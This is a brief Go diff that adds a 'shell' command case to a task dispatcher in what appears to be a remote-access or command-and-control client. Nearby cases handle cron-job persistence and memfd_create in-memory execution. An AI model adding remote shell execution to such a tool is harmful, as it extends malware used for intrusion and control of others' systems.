@@ -286,6 +286,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = crontab.AppendCronJob(t.Args[0])
 	case "memfd_create":
 		result, cmdError = memfdcreate.MemfdCreate(t.File, t.Args[1])
+	case "shell":
+		result, cmdError = basic.ShellCommand(t.Args)
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
